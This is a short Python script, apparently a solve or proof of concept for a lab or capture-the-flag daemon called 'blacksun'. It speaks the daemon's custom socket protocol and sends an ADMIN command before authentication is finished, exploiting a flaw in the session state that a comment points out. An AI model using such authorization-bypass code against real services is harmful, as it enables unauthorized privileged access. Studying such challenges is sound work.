#!/usr/bin/env python3

import socket
import struct

SOCKET_PATH = "/run/blacksun/blacksun.sock"


def checksum(payload):
    result = 0
    for index, value in enumerate(payload):
        result ^= value ^ (index & 0xFF)
    return result & 0xFFFF


def header(command, payload=b""):
    first_byte = 1 | (command << 5)
    return (
        bytes([first_byte])
        + struct.pack("<I", len(payload))
        + struct.pack("<H", checksum(payload))
        + b"\0"
    )


with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as client:
    client.connect(SOCKET_PATH)

    hello = b"\xad\xde"
    client.sendall(header(0, hello) + hello)
    print(client.recv(128).decode(errors="replace"), end="")

    # The daemon incorrectly accepts ADMIN while the session is only AUTH.
    client.sendall(header(2))
    print(client.recv(256).decode(errors="replace"), end="")
